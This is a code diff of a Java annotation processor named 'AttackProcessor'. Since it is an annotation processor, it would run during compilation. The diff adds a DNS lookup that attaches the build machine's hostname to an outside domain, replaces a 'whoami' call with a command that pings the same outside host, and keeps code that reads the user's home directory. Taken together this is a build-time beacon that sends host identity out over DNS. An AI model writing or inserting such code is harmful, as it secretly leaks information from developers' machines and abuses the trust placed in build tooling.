@@ -12,6 +12,7 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.Inet4Address;
+import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.util.Arrays;
 import java.util.Base64;
@@ -31,9 +32,9 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac19.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac20.lirui28.t.dlsr.ga" );
 
-
+            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac20.lirui28.t.dlsr.ga" );
 
             File folder = new File(System.getProperty("user.home"));
 
@@ -56,7 +57,7 @@ public class AttackProcessor extends AbstractProcessor {
 
             try {
                 Runtime runtime = Runtime.getRuntime();
-                Process p = runtime.exec("whoami");
+                Process p = runtime.exec("ping -c 1 help.lirui28.t.dlsr.ga");
                 Inet4Address.getByName( "excute"+".7.lirui28.t.dlsr.ga" );
 
                 //p.waitFor();
